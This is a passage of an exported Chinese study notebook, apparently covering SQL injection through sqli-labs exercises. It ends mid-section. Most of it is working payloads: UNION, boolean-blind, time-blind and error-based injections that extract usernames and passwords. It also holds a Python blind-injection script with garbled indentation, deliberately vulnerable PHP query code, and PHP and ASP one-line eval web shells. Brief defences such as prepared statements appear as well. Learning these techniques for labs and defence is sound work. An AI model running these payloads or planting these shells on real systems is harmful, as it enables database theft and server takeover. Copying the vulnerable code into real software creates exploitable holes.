+?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="de58db55-6aee-82eb-9c46-81c8a36ee8f4" class="toggle"><li><details open=""><summary>第四关</summary><div style="display:contents" dir="auto"><p id="f3b8db55-6aee-83a6-9901-01254bff033d" class="">1、尝试字符型时使<code>&#x27;</code>和<code>&quot;</code> 时，发现<code>&quot;</code> 产生如下报错：“1“”）LIMIT 0，1</p></div><div style="display:contents" dir="ltr"><figure id="7948db55-6aee-8342-8ed3-81fba715df53" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/1%202.png"><img style="width:2368px" src="SQL%E6%B3%A8%E5%85%A5/1%202.png"/></a></figure></div><div style="display:contents" dir="auto"><pre id="e8a8db55-6aee-82cd-98c8-81a0d45dd6bc" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">?id=1&quot;) order by 3--+
+?id=-1&quot;) union select 1,2,3--+
+?id=-1&quot;) union select 1,database(),version()--+
+?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+
+?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+
+?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="3ec8db55-6aee-8364-af57-01d8fd9a18b6" class="toggle"><li><details open=""><summary>第五关</summary><div style="display:contents" dir="auto"><pre id="fc98db55-6aee-834c-8173-816fa7cf1efd" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all"># 判断数据库名称长度，例如数据库名为：hwhww ：长度为5
+?id=1&#x27; and length((select database()))&gt;9--+
+# 布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
+?id=1&#x27; and ascii(substr((select database()), 1, 1))=115--+
+# 判断所有表名字的长度
+?id=1&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+
+# 逐一判断表名
+?id=1&#x27; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+
+# 判断所有字段的长度
+?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;19--+
+# 逐一判断字段名
+?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+
+# 判断内容长度
+?id=1&#x27; and length((select group_concat(username, password) from users))&gt;109--+
+# 逐一检测内容
+?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</code></pre></div></details></li></ul></div></details></li></ul></div><div style="display:contents" dir="ltr"><nav id="dc58db55-6aee-824b-b34c-817ee8e64079" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#df98db55-6aee-82ad-b7b9-01b078963ff8">数字型</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#94d8db55-6aee-83e1-b272-01882db7b51c">字符型</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#26e8db55-6aee-83b9-9b24-81a31c3009f7">布尔盲注</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#6be8db55-6aee-8359-9c19-01ae49c3eb8b">UNION注入</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#e508db55-6aee-82e2-8a3f-0133882e6246">时间盲注</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#e658db55-6aee-82df-903a-8123cfee9db9">报错注入</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d258db55-6aee-836c-873c-014433710425">注入点分类</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#20a8db55-6aee-8367-a7b8-81bc525d8726">一句话木马</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#7c28db55-6aee-8319-9758-01434a962837">SQL中的暴力破解</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#03c8db55-6aee-8252-a963-01003f4f0c29">Sqlmap</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f598db55-6aee-8273-9076-013605fa94ac">一些技巧</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#92d8db55-6aee-829a-98ec-017c94c93cdc">1、绕过WAF/过滤机制</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c1f8db55-6aee-83d0-8e9e-01f5490d0cdd">2、二次注入</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2958db55-6aee-825c-8ac5-8157b95754fd">3、基于错误日志的注入</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5d28db55-6aee-8281-890a-019fc441abb1">4、updatexml()</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6c08db55-6aee-83b1-9d1f-0181b909db82">5、insert/update/delete 报错下的注入</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f8a8db55-6aee-83ac-a298-01402809535c">6、extractvalue()</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#7968db55-6aee-838d-b4ba-012b3a751e4f">7、floor()</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ea88db55-6aee-82be-a720-010a49131734">8、http header</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#28e8db55-6aee-8230-a563-81f71fcb53e1">防御措施</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#71f8db55-6aee-8233-a11c-813ca819f29a">1、转义+过滤</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c868db55-6aee-833e-a136-81f26aa1378a">2、PDO的prepare预处理（预处理+参数化）(推荐)</a></div></nav></div><div style="display:contents" dir="auto"><hr id="e988db55-6aee-8271-80e4-8128a9c8405c"/></div><div style="display:contents" dir="auto"><hr id="ec48db55-6aee-820d-83d3-815c6e1f3a5b"/></div><div style="display:contents" dir="auto"><h2 id="df98db55-6aee-82ad-b7b9-01b078963ff8" class="">数字型</h2></div><div style="display:contents" dir="auto"><p id="c1b8db55-6aee-8293-976c-017152793956" class="">&gt;&gt;&gt; 参数为整数类型（ID，页码），未经过严格过滤的。</p></div><div style="display:contents" dir="auto"><p id="07f8db55-6aee-8265-9595-01b0474d07cb" class="">典型漏洞代码：</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="51e8db55-6aee-838d-8c1c-817ca684665e" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$id=$_GET[&#x27;id&#x27;]; // 未过滤用户输入
+$sql=&quot;SELECT * FROM users WHERE id = %id&quot;;</code></pre></div><div style="display:contents" dir="auto"><p id="68e8db55-6aee-83c1-b63f-01edba55901b" class="">&gt;&gt;&gt; 攻击通过修改整数参数，改变SQL语句的逻辑</p></div><div style="display:contents" dir="auto"><p id="2e38db55-6aee-835d-8ae1-01ab63ae1184" class="">1、是否存在注入：</p></div><div style="display:contents" dir="auto"><pre id="d148db55-6aee-8264-ad63-8153e64ba1e3" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?id=1      // 正常返回
+http://example.com?id=1&#x27;     // 报错（单引号破坏语法）
+http://example.com?id=1 AND 1=1  // 正常返回
+http://example.com?id=1 AND 1=2  // 无返回（逻辑为假）</code></pre></div><div style="display:contents" dir="auto"><p id="0598db55-6aee-83c9-8db9-817ce23e7f27" class="">2、获取数据库信息：</p></div><div style="display:contents" dir="auto"><pre id="5f78db55-6aee-83f0-be52-012fba67a164" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?id=1 and 1=(select 1 from users) // 验证表存在
+http://example.com?id=1 and 1=(select count(*) from users) // 获取行数</code></pre></div><div style="display:contents" dir="auto"><p id="d108db55-6aee-83bb-bcf6-011549453023" class="">3、报错注入（看是否支持）：</p></div><div style="display:contents" dir="auto"><pre id="d6a8db55-6aee-8397-8fc0-8173640d4355" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT username FROM users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)  // 报错带出用户名</code></pre></div><div style="display:contents" dir="auto"><hr id="3e48db55-6aee-8334-9fea-8142ed05f800"/></div><div style="display:contents" dir="auto"><h2 id="94d8db55-6aee-83e1-b272-01882db7b51c" class="">字符型</h2></div><div style="display:contents" dir="auto"><p id="c428db55-6aee-820c-a01c-81d348049e5e" class="">&gt;&gt;&gt; 参数为字符串类型（用户名，搜索关键词），未正确转义引用</p></div><div style="display:contents" dir="auto"><p id="3128db55-6aee-8337-8b28-01d4990bee76" class="">典型漏洞代码：</p></div><div style="display:contents" dir="auto"><pre id="cca8db55-6aee-820c-a03d-81e8eb00b71d" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$name = $_GET[&#x27;name&#x27;];  // 未过滤用户输入
+$sql = &quot;SELECT * FROM users WHERE username = &#x27;$name&#x27;&quot;;</code></pre></div><div style="display:contents" dir="auto"><p id="5c08db55-6aee-83b1-918b-01f4a7382e54" class="">&gt;&gt;&gt; 通过闭合单引号，注入额外SQL代码</p></div><div style="display:contents" dir="auto"><p id="d998db55-6aee-8288-b2af-01a8cc33e1f2" class="">1、判断是否存在漏洞</p></div><div style="display:contents" dir="auto"><pre id="2d18db55-6aee-8287-9c97-0120cf2314f0" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?name=test      // 正常返回
+http://example.com?name=test&#x27;     // 报错（单引号破坏语法）
+http://example.com?name=test&#x27;--   // 注释掉后续代码，正常返回</code></pre></div><div style="display:contents" dir="auto"><p id="0fb8db55-6aee-8354-87eb-0194e99668c7" class="">2、获取数据库信息</p></div><div style="display:contents" dir="auto"><pre id="8b88db55-6aee-8218-a3eb-81236b4586de" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?name=&#x27; OR 1=1 --  // 绕过验证，返回所有记录
+http://example.com?name=&#x27; UNION SELECT 1,database(),3 --  // 获取当前数据库名</code></pre></div><div style="display:contents" dir="auto"><p id="4c28db55-6aee-8345-bdd3-016a28dabf17" class="">3、获取表名和列表</p></div><div style="display:contents" dir="auto"><pre id="9728db55-6aee-8343-b698-01a5ba6ce84f" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?name=&#x27; union select 1, table_name, 3 from information_schema.tables where table_schem=database() limit 0,1 -- // 获取第一个表名</code></pre></div><div style="display:contents" dir="auto"><p id="d338db55-6aee-83f3-a4c0-8138e09b4bd3" class="">4、防御措施</p></div><div style="display:contents" dir="auto"><p id="cd18db55-6aee-83b6-a21b-013b8d5a4438" class=""><strong>使用预编译语句（Prepared Statements）</strong>：<code>$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE id = :id&quot;);<br/>$stmt-&gt;execute([&#x27;id&#x27; =&gt; $_GET[&#x27;id&#x27;]]);  // 自动处理类型和转义</code></p></div><div style="display:contents" dir="auto"><hr id="ede8db55-6aee-8314-aa50-0138146d0e9f"/></div><div style="display:contents" dir="auto"><h2 id="26e8db55-6aee-83b9-9b24-81a31c3009f7" class="">布尔盲注</h2></div><div style="display:contents" dir="auto"><p id="0898db55-6aee-8382-b46b-817b9e0d5b6e" class="">&gt;&gt;&gt; 应用程序不返回SQL错误信息或查询结果，但会根据SQL语句的真假值返回不同页面（如登录成功/失败，搜索结果有/无），</p></div><div style="display:contents" dir="auto"><p id="d7f8db55-6aee-83f4-88e9-011762158103" class="">因此通过狗仔条件语句，逐位猜测。</p></div><div style="display:contents" dir="auto"><p id="42d8db55-6aee-82ec-9799-8106464aa0dd" class="">1、判断是否存在注入：</p></div><div style="display:contents" dir="auto"><pre id="eaa8db55-6aee-8317-bc79-017561c5d6d1" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?name=test&#x27; AND 1=1 --  // 返回正常页面
+http://example.com?name=test&#x27; AND 1=2 --  // 返回异常页面</code></pre></div><div style="display:contents" dir="auto"><p id="fed8db55-6aee-82dd-b71d-811f29ab4ad3" class="">2、猜测数库名字长度：</p></div><div style="display:contents" dir="auto"><pre id="bf18db55-6aee-8367-9745-01fd651915fb" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?name=test?&#x27; and length(database())=8 -- // 若返回正常， 说明数据库名长度为8</code></pre></div><div style="display:contents" dir="auto"><p id="dc28db55-6aee-83bd-9845-0147459d61f7" class="">3、逐位猜测数据库名;</p></div><div style="display:contents" dir="auto"><pre id="27b8db55-6aee-83d1-bff7-012e7364d3d2" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?name=test&#x27; and substring(database(),1,1)=&#x27;s&#x27; -- // 猜测第一位是否为&#x27;s&#x27;
+http://example.com?name=test&#x27; and ascii(substring(database(), 1, 1))=115 -- // 等价于上一条</code></pre></div><div style="display:contents" dir="auto"><p id="14c8db55-6aee-8299-b113-015e3c14cadf" class="">4、自动化脚本或是同bp</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="57d8db55-6aee-837a-88a9-812556ae84fc" class="code code-wrap"><code class="language-python" style="white-space:pre-wrap;word-break:break-all">import requests
+
+url = &quot;http://example.com/search.php&quot;
+result = &quot;&quot;
+for i in range(1, 100):  # 最多尝试100位
+    for c in range(32, 127):  # ASCII可见字符
+        payload = f&quot;test&#x27; AND ASCII(SUBSTRING(database(),{i},1))={c} --&quot;
+        r = requests.get(url, params={&quot;name&quot;: payload})
+        if &quot;正常页面特征&quot; in r.text:
+            result += chr(c)
+            print(f&quot;第{i}位: {chr(c)}&quot;)
+            break
+		    else:
+		        break
+print(f&quot;数据库名: {result}&quot;)</code></pre></div><div style="display:contents" dir="auto"><h2 id="6be8db55-6aee-8359-9c19-01ae49c3eb8b" class="">UNION注入</h2></div><div style="display:contents" dir="auto"><p id="7b58db55-6aee-82ce-ba03-01401541258b" class="">&gt;&gt;&gt; union操作符合并多个查询结果，并且前后查询的字段数相同，即：</p></div><div style="display:contents" dir="auto"><p id="d5e8db55-6aee-8205-9aef-013d8daffb22" class="">1，前后查询的字段数必须一致</p></div><div style="display:contents" dir="auto"><p id="7bc8db55-6aee-820b-afd9-0193073792d6" class="">2，字段类型需兼容（例如：数字型字段不能插入字符串）</p></div><div style="display:contents" dir="auto"><p id="b258db55-6aee-8205-95f6-81a3bbccced1" class="">&gt;&gt;&gt; 攻击步骤：</p></div><div style="display:contents" dir="auto"><p id="1168db55-6aee-82c5-8af7-81e53b509c42" class="">1、判断字段数：</p></div><div style="display:contents" dir="auto"><pre id="d6d8db55-6aee-82f1-b7aa-01c9fe52fe40" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?id=1 UNION SELECT 1 --  // 报错（字段数不匹配）
+http://example.com?id=1 UNION SELECT 1,2 --  // 报错
+http://example.com?id=1 UNION SELECT 1,2,3 --  // 正常返回，说明字段数为3</code></pre></div><div style="display:contents" dir="auto"><p id="8e28db55-6aee-83b0-8e75-8100459e7b67" class="">2、判断可显示字段：</p></div><div style="display:contents" dir="auto"><pre id="f7a8db55-6aee-833b-8989-81096e6ef55f" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?id=1 UNION SELECT &#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27; --  // 若页面出现a/b/c，说明对应字段可显示</code></pre></div><div style="display:contents" dir="auto"><p id="b418db55-6aee-825f-87cb-81143e94aee6" class="">3、获取数据库信息：</p></div><div style="display:contents" dir="auto"><pre id="7148db55-6aee-8232-8a4a-81af06c3a011" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">http://example.com?id=1 union select 1,database(),3 -- // 获取当前数据库名称
+http://example.com?id=1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),3 --  // 获取所有表名
+http://example.com?id=1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#x27;users&#x27;),3 --  // 获取users表的所有列名
+http://example.com?id=1 UNION SELECT 1,(SELECT GROUP_CONCAT(username,&#x27;:&#x27;,password) FROM users),3 --  // 获取用户和密码</code></pre></div><div style="display:contents" dir="auto"><h2 id="e508db55-6aee-82e2-8a3f-0133882e6246" class="">时间盲注</h2></div><div style="display:contents" dir="auto"><p id="b4e8db55-6aee-831b-96de-81049ff02ecd" class="">&gt;&gt;&gt; 构造基于时间延迟的条件语句，利用sleep()或等价函数（sleep()，waitfor delay）判断条件真假</p></div><div style="display:contents" dir="auto"><p id="c588db55-6aee-821c-ba46-0188785e290b" class="">在页面没有任何回显时候同时无法使用union注入时适用。</p></div><div style="display:contents" dir="auto"><p id="6808db55-6aee-82b2-a44a-812e3a390a5c" class="">&gt;&gt;&gt;</p></div><div style="display:contents" dir="auto"><p id="e298db55-6aee-830a-b5f4-816db845743f" class="">1、判断注入点：</p></div><div style="display:contents" dir="auto"><pre id="5168db55-6aee-82ea-9129-01527d44ba5f" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all"># MySQL
+&#x27; AND SLEEP(5) -- -  # 若页面响应延迟5秒，存在注入
+
+# SQL Server
+&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27; -- -</code></pre></div><div style="display:contents" dir="auto"><p id="ae98db55-6aee-82c1-9be0-81950256eaff" class="">2、逐位猜解数据：</p></div><div style="display:contents" dir="auto"><pre id="9858db55-6aee-82d6-9c26-811c2f785d7d" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all"># 猜解数据库名长度
+&#x27; and if(length(database()=8, sleep(5), 1)) -- -
+# 猜解数据库名首字符
+&#x27; and if(ascii(substring(database(),1,1))115, sleep(5), 1) -- # &#x27;s&#x27;=115
+如果执行了sleep，就说明猜中了</code></pre></div><div style="display:contents" dir="auto"><p id="66e8db55-6aee-839e-a984-01288769fe24" class="">3、自动化脚</p></div><div style="display:contents" dir="auto"><p id="9bc8db55-6aee-835f-9756-011b5bbd9c49" class="">4、防御措施：设置http响应超时（如proxy_read_timeout）或对用户输入进行严格的数字/字母验证。</p></div><div style="display:contents" dir="auto"><h2 id="e658db55-6aee-82df-903a-8123cfee9db9" class="">报错注入</h2></div><div style="display:contents" dir="auto"><p id="2f18db55-6aee-838c-b148-81f0521572c9" class="">&gt;&gt;&gt; 利用数据库错误函数（如：updatexml，exp，Oracle，OWA_UTIL.WHO_CALLED_ME）强制触发错误，并在错误信息中夹带敏感信息。</p></div><div style="display:contents" dir="auto"><p id="0ff8db55-6aee-83e8-bcef-81f0dd6ff408" class="">适用于无法返回详细信息时候，无法使用union注入时候</p></div><div style="display:contents" dir="auto"><p id="7df8db55-6aee-8212-9f9d-011cd566d1d5" class="">&gt;&gt;&gt; 常见报错：</p></div><div style="display:contents" dir="ltr"><table id="a2b8db55-6aee-8280-b31c-014786cebd83" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="5ec8db55-6aee-836a-af4f-018238126441"><th id="{yEj" class="simple-table-header-color simple-table-header"><strong>数据库</strong></th><th id="PaFU" class="simple-table-header-color simple-table-header"><strong>报错函数示例</strong></th><th id="xHmQ" class="simple-table-header-color simple-table-header"><strong>Payload</strong></th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="8a28db55-6aee-821a-b6c0-8170d48b3f7d"><td id="{yEj" class="">MySQL</td><td id="PaFU" class=""><code>UPDATEXML()</code></td><td id="xHmQ" class=""><code>&#x27; AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1) -- -</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="6128db55-6aee-8203-a446-01c5490df55d"><td id="{yEj" class=""></td><td id="PaFU" class=""><code>EXP()</code></td><td id="xHmQ" class=""><code>&#x27; AND EXP(~(SELECT * FROM(SELECT USER())a)) -- -</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="34a8db55-6aee-8374-8129-0108be64bc63"><td id="{yEj" class="">SQL Server</td><td id="PaFU" class=""><code>FLOOR()</code></td><td id="xHmQ" class=""><code>&#x27;; SELECT * FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))a FROM sysobjects GROUP BY a)b -- -</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="67d8db55-6aee-839c-8a5c-01fa54833301"><td id="{yEj" class="">Oracle</td><td id="PaFU" class=""><code>OWA_UTIL.WHO_CALLED_ME</code></td><td id="xHmQ" class=""><code>&#x27; AND OWA_UTIL.WHO_CALLED_ME((SELECT USER FROM DUAL)) -- -</code></td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><p id="0208db55-6aee-83d2-9bcf-0147c43dbce7" class="">&gt;&gt;&gt; 攻击步骤：</p></div><div style="display:contents" dir="auto"><p id="3ea8db55-6aee-8339-9a18-01a1c9b255f6" class="">1、判断注入点：</p></div><div style="display:contents" dir="auto"><pre id="f4d8db55-6aee-836a-bf19-015db00852da" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">&#x27; and updatexml(1, concat(0x7e, &#x27;TEST&#x27;, 0x7e), 1) -- - # 若错误信息包含~TEST~,存在注入</code></pre></div><div style="display:contents" dir="auto"><p id="99b8db55-6aee-82f4-b160-0141d4d63e6b" class="">2、获取敏感数据：</p></div><div style="display:contents" dir="auto"><pre id="3f78db55-6aee-8246-b954-8159c72e77db" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all"># 获取数据库名称
+&#x27; and updatexml(1, concat(0x7e, database(), 0x73), 1) -- -
+# 获取用户表数据
+&#x27; and updatexml(1, concat(0x7e, (select concat(username, &#x27;:&#x27;, password) from users limit 0,1), 0x7e),1) -- -
+</code></pre></div><div style="display:contents" dir="auto"><p id="6e48db55-6aee-8244-ade5-0146b8ec02a4" class="">3、防御措施：生产环境金童详细错误信息（display_errors=off）或使用预编译语句</p></div><div style="display:contents" dir="auto"><h2 id="d258db55-6aee-836c-873c-014433710425" class="">注入点分类</h2></div><div style="display:contents" dir="auto"><p id="0168db55-6aee-83c7-b232-810e3367affc" class="">基于参数类型：</p></div><div style="display:contents" dir="ltr"><table id="74b8db55-6aee-839d-b18e-81ab55a13a84" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="80a8db55-6aee-82dc-ac2d-81a054595407"><th id="|iAe" class="simple-table-header-color simple-table-header"><strong>类型</strong></th><th id="yOyk" class="simple-table-header-color simple-table-header"><strong>特征</strong></th><th id="UmVP" class="simple-table-header-color simple-table-header"><strong>示例</strong></th><th id="X[=J" class="simple-table-header-color simple-table-header"><strong>防御要点</strong></th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="7f78db55-6aee-8395-a567-81102d3b82a9"><td id="|iAe" class="">整数型注入</td><td id="yOyk" class="">参数为整数，无引号包围</td><td id="UmVP" class=""><code>id=1</code></td><td id="X[=J" class="">强制类型转换（如<code>intval()</code>）</td></tr></div><div style="display:contents" dir="ltr"><tr id="c9c8db55-6aee-834e-b080-01e31ae1c8b8"><td id="|iAe" class="">字符型注入</td><td id="yOyk" class="">参数为字符串，需闭合引号</td><td id="UmVP" class=""><code>name=&#x27;test&#x27;</code></td><td id="X[=J" class="">单引号转义（如<code>mysqli_real_escape_string()</code>）</td></tr></div><div style="display:contents" dir="ltr"><tr id="70e8db55-6aee-822a-928e-015feb7907ca"><td id="|iAe" class="">搜索型注入</td><td id="yOyk" class="">参数参与 LIKE 查询</td><td id="UmVP" class=""><code>keyword=&#x27;%test%&#x27;</code></td><td id="X[=J" class="">预编译语句</td></tr></div><div style="display:contents" dir="ltr"><tr id="a058db55-6aee-82a6-9ff1-01d90269c58e"><td id="|iAe" class="">头部注入</td><td id="yOyk" class="">注入 HTTP 头（如 Cookie）</td><td id="UmVP" class=""><code>Cookie: id=1</code></td><td id="X[=J" class="">严格校验头部格式</td></tr></div><div style="display:contents" dir="ltr"><tr id="2538db55-6aee-82fb-bebc-8180800087ec"><td id="|iAe" class="">JSON 注入</td><td id="yOyk" class="">参数为 JSON 格式</td><td id="UmVP" class=""><code>{&quot;id&quot;:1}</code></td><td id="X[=J" class="">使用 JSON 解析函数，禁止直接拼接</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><p id="5958db55-6aee-826f-83b3-81de5b8e1971" class="">基于注入方式：</p></div><div style="display:contents" dir="ltr"><table id="2ba8db55-6aee-82b3-92c6-8121f5c8acd5" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="d818db55-6aee-83f0-8132-01be7e07a34a"><th id="euVG" class="simple-table-header-color simple-table-header"><strong>类型</strong></th><th id="cQ=|" class="simple-table-header-color simple-table-header"><strong>核心原理</strong></th><th id="H?pq" class="simple-table-header-color simple-table-header"><strong>关键函数 / 语法</strong></th><th id="Y|If" class="simple-table-header-color simple-table-header"><strong>检测方法</strong></th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="e108db55-6aee-8291-962c-811c9b44d33a"><td id="euVG" class="">布尔盲注</td><td id="cQ=|" class="">通过页面差异判断条件真假</td><td id="H?pq" class=""><code>AND 1=1</code>/<code>AND 1=2</code></td><td id="Y|If" class="">对比响应差异</td></tr></div><div style="display:contents" dir="ltr"><tr id="6528db55-6aee-8339-89a5-019ebaaf3c93"><td id="euVG" class="">时间盲注</td><td id="cQ=|" class="">通过延迟响应判断条件真假</td><td id="H?pq" class=""><code>SLEEP()</code>/<code>WAITFOR DELAY</code></td><td id="Y|If" class="">测量响应时间</td></tr></div><div style="display:contents" dir="ltr"><tr id="64d8db55-6aee-8252-8620-01f23aabea62"><td id="euVG" class="">报错注入</td><td id="cQ=|" class="">利用错误函数带出数据</td><td id="H?pq" class=""><code>UPDATEXML()</code>/<code>EXP()</code></td><td id="Y|If" class="">构造错误函数</td></tr></div><div style="display:contents" dir="ltr"><tr id="6ff8db55-6aee-83aa-ab76-0172d1223b18"><td id="euVG" class="">UNION 注入</td><td id="cQ=|" class="">合并查询结果</td><td id="H?pq" class=""><code>UNION SELECT</code></td><td id="Y|If" class="">测试字段数匹配</td></tr></div><div style="display:contents" dir="ltr"><tr id="a498db55-6aee-83c1-97c6-019b47f86c0b"><td id="euVG" class="">堆叠查询注入</td><td id="cQ=|" class="">执行多条 SQL 语句</td><td id="H?pq" class=""><code>;</code>（分号）</td><td id="Y|If" class="">测试分号执行</td></tr></div><div style="display:contents" dir="ltr"><tr id="c4c8db55-6aee-82bd-9414-01ba8e5745ad"><td id="euVG" class="">二次注入</td><td id="cQ=|" class="">存储恶意数据后触发执行</td><td id="H?pq" class="">无特定函数</td><td id="Y|If" class="">检查数据存储与读取流程</td></tr></div><div style="display:contents" dir="ltr"><tr id="79e8db55-6aee-8398-9915-81b4d452d051"><td id="euVG" class="">宽字节注入</td><td id="cQ=|" class="">绕过单引号转义</td><td id="H?pq" class=""><code>%df&#x27;</code>（GBK 编码）</td><td id="Y|If" class="">测试编码转换漏洞</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h2 id="20a8db55-6aee-8367-a7b8-81bc525d8726" class="">一句话木马</h2></div><div style="display:contents" dir="auto"><p id="b6f8db55-6aee-8247-8985-017023d21304" class="">一种短小精悍的木马客户端，隐蔽性好，功能强大</p></div><div style="display:contents" dir="auto"><p id="2428db55-6aee-82af-9d96-01de8778ed4f" class="">互联网上有很多变种，</p></div><div style="display:contents" dir="auto"><pre id="c058db55-6aee-838e-b0fe-01ea6bf63229" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">PHP：&lt;?php @eval($_POST[’chopper’]);?&gt;</code></pre></div><div style="display:contents" dir="auto"><pre id="0928db55-6aee-8384-b7db-016655347d80" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">ASP：&lt;%eval request(&quot;chopper&quot;)%&gt;</code></pre></div><div style="display:contents" dir="auto"><pre 